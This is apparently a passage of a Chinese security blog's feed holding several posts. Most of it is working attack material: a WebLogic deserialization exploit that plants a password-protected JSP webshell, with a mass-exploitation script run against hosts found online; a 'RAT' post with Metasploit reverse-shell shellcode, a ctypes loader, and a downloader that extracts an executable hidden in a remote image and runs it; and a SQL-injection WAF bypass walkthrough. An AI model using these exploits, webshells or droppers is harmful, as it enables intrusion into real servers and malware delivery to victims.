PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshells.jsp&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/04/26/EnGllT.md.png" alt=""></p><p>测试是否成功getshell<br><img src="https://s2.ax1x.com/2019/04/26/EnGong.png" alt=""></p><h3 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h3><pre><code class="python">#author:九世#time:2019/4/26import geventfrom gevent import  monkey;monkey.patch_all()import requestsimport osimport sysfrom multiprocessing import Processclass Weblogic:    def __init__(self,headers,data,path):        self.headers=headers        self.data=data        self.path=path    def exploit(self,url):        urls=&#39;{}{}&#39;.format(str(url).rstrip(&#39;/&#39;).strip(),self.path)        urls2=&#39;{}{}&#39;.format(str(url).rstrip(&#39;/&#39;).strip(),&#39;/_async/webshells.jsp&#39;)        try:            rqt=requests.get(url=urls,headers=self.headers)            if rqt.status_code==200 and &#39;Test page&#39; in rqt.text:                rvt=requests.post(url=urls,headers=self.headers,data=self.data,timeout=3)                if rvt.status_code==202:                    rbt=requests.get(url=urls2,headers=headers)                    if rbt.status_code==200 and not &#39;404&#39; in rbt.text:                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:{} password:{} 利用方式如:{}&#39;.format(urls2,&#39;123&#39;,&#39;{}?pwd=123&amp;cmd=whoami&#39;.format(urls2)))                        print(&#39;[+] weblogic反序列化漏洞利用成功,ip:{} password:{} 利用方式如:{}&#39;.format(urls2, &#39;123&#39;,&#39;{}?pwd=123&amp;cmd=whoami&#39;.format(urls2)),file=open(&#39;save.txt&#39;,&#39;a&#39;,encoding=&#39;utf-8&#39;))                    else:                        print(&#39;[-] 利用失败 url:{} 状态码:{}&#39;.format(rbt.url,rbt.status_code))                else:                    print(&#39;[-] 利用失败 url:{} 状态码:{}&#39;.format(rvt.url,rvt.status_code))            else:                print(&#39;[-] 不存在weblogic反序列化漏洞-CVE-2019-48814 http状态码:{} url:{}&#39;.format(rqt.status_code,urls))        except:            pass    def xc(self,rw):        xs=[]        for r in rw:            xs.append(gevent.spawn(self.exploit,r))        gevent.joinall(xs)    def djc(self,id):        url_list=[]        calc=0        if str(id)==&#39;1&#39;:            print(&#39;[+] 单个url检测&#39;)            xw=input(&#39;url&gt;&#39;)            self.exploit(url=xw)        elif str(id)==&#39;2&#39;:            print(&#39;[+] 批量检测&#39;)            xw=input(r&#39;文件路径&gt;&#39;)            if os.path.exists(xw):                print(&#39;[+] 找到对应的文件&#39;)                with open(xw,&#39;r&#39;,encoding=&#39;utf-8&#39;) as x:                    calc+=1                    if calc==100:                        p=Process(target=self.xc,args=(url_list,))                        p.start()                        calc=0                        url_list.clear()                    for r in x.readlines():                        qc=&quot;&quot;.join(r.split(&#39;\n&#39;))                        url_list.append(qc)                if len(url_list)&gt;0:                    b = Process(target=self.xc, args=(url_list,))                    b.start()            else:                print(&#39;[-] 找不到对应的文件&#39;)                exit()if __name__ == &#39;__main__&#39;:    headers={&#39;user-agent&#39;:&#39;Apache-HttpClient/4.1.1 (java 1.5)&#39;,&#39;Connection&#39;:&#39;keep-alive&#39;,&#39;content-type&#39;: &#39;text/xml&#39;,&#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;}    path=&#39;/_async/AsyncResponseService&#39;    data=&quot;&quot;&quot;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshells.jsp&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;&quot;&quot;&quot;    obj=Weblogic(headers=headers,data=data,path=path)    obj.djc(sys.argv[1])</code></pre><p>测试结果：<br><b>PS:这里的测试url都是zoomeye前400条</b><br><img src="https://s2.ax1x.com/2019/04/26/EntVmD.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/Entahn.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EntutA.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EntZ0e.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EnlrIx.png" alt=""></p><p><b>利用失败图</b><br><img src="https://s2.ax1x.com/2019/04/26/EntsnU.md.png" alt=""></p><p>仓库地址</p><pre><code>https://github.com/422926799/python/tree/master/CVE-2019-48814%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7</code></pre><p>转载请声明:转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一个比较捞的rat</title>
      <link href="/posts/10e14164.html"/>
      <url>/posts/10e14164.html</url>
      <content type="html"><![CDATA[<h3 id="什么是rat"><a href="#什么是rat" class="headerlink" title="什么是rat"></a>什么是rat</h3><p>可以在受害者机器内安装恶意组件<br>以下来自百度的解释：</p><blockquote><p>rat是特洛伊木马的一个变体，也成为net-hack程序。RAT是一个可以在目标计算机上安装服务器组件的恶意代码。</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.msf生成shellcode<br>2.将shellcode base64编码藏在图片里<br>3.将图片放入远程站点<br>4.py写一个下载远程图片并匹配出base64写入exe<br>5.删除下载的图片</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>msf生成的shellcode</p><pre><code>buf =  b&quot;&quot;buf += b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41&quot;buf += b&quot;\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48&quot;buf += b&quot;\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f&quot;buf += b&quot;\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c&quot;buf += b&quot;\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52&quot;buf += b&quot;\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66&quot;buf += b&quot;\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80&quot;buf += b&quot;\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50&quot;buf += b&quot;\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;buf += b&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48&quot;buf += b&quot;\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75&quot;buf += b&quot;\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;buf += b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b&quot;buf += b&quot;\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;buf += b&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;buf += b&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;buf += b&quot;\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f&quot;buf += b&quot;\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0&quot;buf += b&quot;\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0&quot;buf += b&quot;\xa8\xf1\x84\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba&quot;buf += b&quot;\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00&quot;buf += b&quot;\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41&quot;buf += b&quot;\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48&quot;buf += b&quot;\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;buf += b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2&quot;buf += b&quot;\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0&quot;buf += b&quot;\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48&quot;buf += b&quot;\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;buf += b&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;buf += b&quot;\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;buf += b&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31&quot;buf += b&quot;\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49&quot;buf += b&quot;\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89&quot;buf += b&quot;\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d&quot;buf += b&quot;\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a&quot;buf += b&quot;\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;buf += b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff&quot;buf += b&quot;\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4&quot;buf += b&quot;\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2&quot;buf += b&quot;\x56\xff\xd5&quot;</code></pre><p>使用py来执行shellcode</p><pre><code class="python">import ctypesimport sysimport chardetfrom ctypes import *import binasciibuf =  b&quot;shellcode&quot;#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEMPAGE_EXECUTE_READWRITE = 0x00000040 #参数设定VIRTUAL_MEM = ( 0x1000 | 0x2000 ) #参数设定buf_arr = bytearray (buf) #shellcode变为一个新的字节数组buf_size = len(buf_arr) #计算shellcode的大小kernel32 = ctypes.cdll.LoadLibrary(&quot;kernel32.dll&quot;) #调用kernel32.dllkernel32.VirtualAlloc.restype = ctypes.c_uint64 #返回类型为c_uint64sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #设置buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #将shellcode指向指针#print(sc_ptr)#print(buf_ptr)kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #调用dll，指向shellcodehandle = kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(sc_ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</code></pre><p>将执行shellcode的py打包成exe，然后打开，对其进行base64编码<br>然后用HxDx64打开指定的图片，然后将<br>base64编码的exe写入到图片里</p><p>我的图片是<br><img src="https://s2.ax1x.com/2019/04/20/EPnxwn.png" alt=""></p><p>加入base64编码后的exe<br><img src="https://s2.ax1x.com/2019/04/20/EPnzoq.png" alt=""></p><p>加入shellcode后图片大小为7mb<br><img src="https://s2.ax1x.com/2019/04/20/EPupF0.png" alt=""></p><p><b>注意</b></p><pre><code>将其扔到远程站点，这里以phpstudy搭建为例，不要把放图床，图床会把你图片给模糊或减小你内存shellcode就少了</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码如下</p><pre><code class="python">#author:九世#time:2019/4/20import asyncioimport requestsimport reimport base64import osasync def demo():    url = &#39;http://192.168.3.83/timg.jpg&#39; #你的图片地址    rqt=requests.get(url=url)    with open(&#39;xxx.jpg&#39;,&#39;wb&#39;) as r:        r.write(rqt.content)def zx():    dq=open(&#39;xxx.jpg&#39;,&#39;rb&#39;)    zg=str(dq.read()).replace(&quot;b&#39;&quot;,&#39;&#39;).replace(&quot;&#39;&quot;,&#39;&#39;)    pp=re.findall(&#39;TVq.*&#39;,zg)    zh=base64.b64decode(pp[0])    with open(&#39;demo.exe&#39;,&#39;wb&#39;) as w:        w.write(zh)    os.remove(&#39;xxx.jpg&#39;)    os.system(&#39;demo.exe&#39;)def pd():    j=&#39;xxx.jpg&#39;    if os.path.exists(j):        file=os.path.getsize(j)        if file==7985376:            zx()        else:            exit()async  def main():    thead=[]    thead.append(asyncio.ensure_future(demo()))    await asyncio.wait(thead)if __name__ == &#39;__main__&#39;:    loop=asyncio.get_event_loop()    loop.run_until_complete(main())    loop.close()    pd()</code></pre><p>测试结果<br><img src="https://s2.ax1x.com/2019/04/20/EPusmj.md.gif" alt=""></p><p>仓库地址:</p><pre><code>https://github.com/422926799/python/tree/master/%E7%AE%80%E5%8D%95%E7%9A%84RAT</code></pre><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo安装短链接插件</title>
      <link href="/posts/29a80ae2.html"/>
      <url>/posts/29a80ae2.html</url>
      <content type="html"><![CDATA[<h3 id="为何要用这个插件"><a href="#为何要用这个插件" class="headerlink" title="为何要用这个插件"></a>为何要用这个插件</h3><p>hexo默认的链接方式太长，以至于很难看，而且中文的话<br>分享到qq等等的东东又会把你url自动解码，所以这个插件能解决这些问题</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>npm install hexo-abbrlink --save</code></pre><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开config.yml，修改permalink中类似这样<br>permalink: posts/:abbrlink.html</p><p>我的配置文件</p><pre><code class="yml">permalink_defaults:abbrlink:    alg: crc32  # 算法：crc16(default) and crc32    rep: hex    # 进制：dec(default) and hexpermalink: posts/:abbrlink.html</code></pre><h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>修改完之后执行</p><pre><code>hexo clean #清除缓存hexo g #重新渲染</code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://s2.ax1x.com/2019/04/19/E96OpT.png" alt=""></p><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过安全狗新版进行SQL注入</title>
      <link href="/posts/aafbd292.html"/>
      <url>/posts/aafbd292.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在圈子见到某师傅过了安全狗然后注入，然后自己手痒<br>也搭了个环境进行测试。期间搭建环境各种坑….<br>不过后面还是有个不错的结果的</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31311706&auto=1&height=66"></iframe><p><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.md.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我是用phpstudy+安全狗4.0搭建的环境<br>一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕）</p><p>解决方法：</p><pre><code>以管理员权限运行cmd，进入apache/bin目录httpd -k install -n apache2.4以管理员权限运行cmd，进入mysql/bin目录mysqld -k install -n MySQla</code></pre><p>php代码如下</p><pre><code class="php">&lt;?php$username=&quot;root&quot;;$password=&quot;root&quot;;$host=&quot;localhost:3306&quot;;$database=&quot;test&quot;;$con=mysqli_connect($host,$username,$password,$database);if(!$con){    exit(&quot;Connect mysql faild....&quot;);}if(isset($_GET[&#39;id&#39;])){    $sql=&quot;select * from demo where id=&quot;.$_GET[&#39;id&#39;];    echo $sql;    echo &quot;&lt;br&gt;&quot;;    $cha=mysqli_query($con,$sql);    $jg=mysqli_fetch_array($cha);    var_dump($jg);}?&gt;</code></pre><p>数据库表和字段如下<br><img src="https://s2.ax1x.com/2019/04/19/EpaxK0.png" alt=""></p><p>尝试and 1=1和and 1=2毫无疑问被拦截了<br><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.png" alt=""></p><p>使用 %26%26 True 和 %26%26 False</p><pre><code>%26=&amp;&amp;=and</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EparDK.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpdA2R.png" alt=""></p><p>使用Xor True 和 Xor False 也不拦<br><img src="https://s2.ax1x.com/2019/04/19/Epd8xI.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpwFw8.png" alt=""></p><p>order内联注释就可以绕过</p><pre><code>http://127.0.0.1/sqli.php?id=1/**//*!order*//**//*!by*//**//*!1*/</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpwQmV.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpwJfJ.png" alt=""></p><p>union select卡住了。。。怎么也绕不过，后面改去整盲注了<br><img src="https://s2.ax1x.com/2019/04/19/EpBDRH.md.png" alt=""></p><p>and length(database())=8被杀，后面看了网上的文章，@@version database/**/() 这样写不会被杀</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (length(database/**/())=4)</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpBcLt.png" alt=""></p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (ascii(@@version)=53)</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpBOoT.png" alt=""></p><p>判断有多少个表</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!table_name*/) from information_schema.tables where table_schema=0x74657374))</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpDkTK.png" alt=""></p><p>猜表，由于这里使用ascii会被拦截，还有table_name也拦截<br><img src="https://s2.ax1x.com/2019/04/19/Eprn4U.md.png" alt=""></p><p>使用hex函数代替ascii函数，使用count(/<em>!table_name</em>/)</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1)))</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/Ep6lvQ.md.png" alt=""></p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1))=64)</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/Ep6N5V.png" alt=""></p><p>猜字段个数</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (2=(select count(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F))</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/Ep6rr9.png" alt=""></p><p>猜字段</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1)))</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpccLj.png" alt=""></p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1))=69)v </code></pre><p><img src="https://s2.ax1x.com/2019/04/19/EpcHOJ.md.png" alt=""></p><p>猜字段内容有多少个</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/) from demo))</code></pre><p><img src="http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/" alt=""> from demo)))</p><p>猜字段内容</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!name*/) from demo limit 0,1),1,1))=64)</code></pre><p><img src="https://s2.ax1x.com/2019/04/19/Epgb38.png" alt=""></p><p>报错注入绕过安全狗<br>修改php代码</p><pre><code class="php">&lt;?php$username=&quot;root&quot;;$password=&quot;root&quot;;$host=&quot;localhost:3306&quot;;$database=&quot;test&quot;;$con=mysqli_connect($host,$username,$password,$database);if(!$con){    exit(&quot;Connect mysql faild....&quot;);}if(isset($_GET[&#39;id&#39;])){    $sql=&quot;select * from demo where id=&quot;.$_GET[&#39;id&#39;];    echo $sql;    echo &quot;&lt;br&gt;&quot;;    $cha=mysqli_query($con,$sql);    $jg=mysqli_fetch_array($cha);    if(!isset($jg)){        $error=mysqli_error($con);        echo $error;        exit();    }    var_dump($jg);}?&gt;</code></pre><p>updatexml(1,,1) #安全狗正则匹配(1,内容,1)不论里面是什么都杀,还有过滤concat(0x7e,,0x7e) 总之过滤了逗号，然后各种报错注入折腾了半天<br><img src="https://s2.ax1x.com/2019/04/19/Ep2HaR.md.png" alt=""></p><p>然后从印象笔记翻出一篇文章= =里面用的操作可真骚</p><pre><code>http://127.0.0.1/sqli.php?id=1-a()</code></pre><p>用一个不存在的函数即可获取数据库名<br><img src="https://s2.ax1x.com/2019/04/19/EpOErR.png" alt=""></p><p>输入一个存在的列名即可获取：数据库名，表名，字段名<br>可以拿sqlmap跑字段名的字典配合burp爆破</p><pre><code>http://127.0.0.1/sqli.php?id=1 %26%26 polygon(id)</code></pre><p>….搞不出了搞不出了。。，告辞</p><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>获取每天新的CVE</title>
      <link href="/posts/5674cd5.html"/>
      <url>/posts/5674cd5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看RSS的时候发现有篇文章说到抓取某接口获取每天新的CVE然后保存到数据库并通过邮箱告知CVE更新了。由于个人觉得不错索性就进行爬了<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>接口是<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">CVE接口</a><br><img src="https://s2.ax1x.com/2019/04/14/AOd8T1.png" alt="AOd8T1.png"></p><p>都是超链接，点进去可以看到详情，直接爬就完事了,由于最近学了异步追求速度<br>思路如下：</p><pre><code>1.抓取接口里url2.异步获取全部详情的url3.写入到xls</code></pre><p>代码如下：</p><pre><code class="python">#author:九世#time:2019/4/14import requestsfrom bs4 import BeautifulSoupimport asynciofrom aiohttp import ClientSessionimport reimport xlwtimport timeimport osnew_cve=[]bh_cve=[]jg_cve=[]class Demon:    def __init__(self,headers,url):        self.headers=headers        self.url=url    def zx(self):        try:            rgt=requests.get(url=self.url,headers=headers,timeout=3)            zg=BeautifulSoup(rgt.text,&#39;html.parser&#39;)            for c in zg.find_all(&#39;a&#39;):                href=c.get(&#39;href&#39;)                new_cve.append(href)        except Exception as r:            print(&#39;[-] Error {}&#39;.format(r))    async def zhuaqu(self,url):        async with ClientSession() as reqt:            try:                async with reqt.get(url=url,headers=self.headers,timeout=2) as respone:                    url=respone.url                    jg_cve.append(url)                    zz=re.findall(&#39;[0-9]{1,}-.*&#39;,str(url))                    bh_cve.append(&#39;CVE-{}&#39;.format(zz[0]))            except:                pass    def writes(self):        workbook=xlwt.Workbook(encoding=&#39;utf-8&#39;)        sheet=workbook.add_sheet(&quot;今天更新的CVE&quot;)        sheet.write(0,0,&quot;CVE编号&quot;)        sheet.write(0,1,&quot;URL&quot;)        for i in range(0,len(bh_cve)):            sheet.write(int(i)+1,0,bh_cve[i])            sheet.write(int(i)+1,1,&#39;{}&#39;.format(jg_cve[i]))        sz=time.time()        workbook.save(&#39;{}.xls&#39;.format(sz))        if os.path.exists(&#39;{}.xls&#39;.format(sz)):            print(&#39;[+] 保存成功&#39;)        else:            print(&#39;[-] 保存失败&#39;)    async def main(self):        td=[]        for n in new_cve:            jc=asyncio.ensure_future(self.zhuaqu(n))            td.append(jc)        await asyncio.wait(td)if __name__ == &#39;__main__&#39;:    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#39;}    urls=&#39;https://cassandra.cerias.purdue.edu/CVE_changes/today.html&#39;    obj=Demon(headers=headers,url=urls)    obj.zx()    loop = asyncio.get_event_loop()    loop.run_until_complete(obj.main())    loop.close()    obj.writes()</code></pre><p>最终结果：<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p><p>仓库地址：<a href="https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过一些正则来触发xss (翻译文)</title>
      <link href="/posts/1c9464a2.html"/>
      <url>/posts/1c9464a2.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天翻译一篇文章，在有限制的地方挖出潜在xss<br>Referer:<a href="https://brutelogic.com.br/blog/xss-limited-input-formats/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/xss-limited-input-formats/</a><br>收获还是可以的</p><p><img src="https://s2.ax1x.com/2019/04/14/AO95CQ.png" alt=""></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>上面的文章给出的练习地址是：<a href="https://brutelogic.com.br/tests/input-formats.php?email=user@domain.com" target="_blank" rel="noopener">https://brutelogic.com.br/tests/input-formats.php?email=user@domain.com</a><br>可以从页面上看到，这个xss练习平台有4题<br><img src="https://s2.ax1x.com/2019/04/13/ALvfqU.md.png" alt=""></p><p><b>第一题</b><br>引用email参数输出，尝试以常规的方式插入xss payload<br><img src="https://s2.ax1x.com/2019/04/13/ALxksf.md.png" alt=""></p><p>发现并没有成功，查看文章后注意文章提到的<br><img src="https://s2.ax1x.com/2019/04/13/ALx6Te.md.png" alt=""></p><p>查看php官网查看该函数</p><blockquote><p>filter_input — 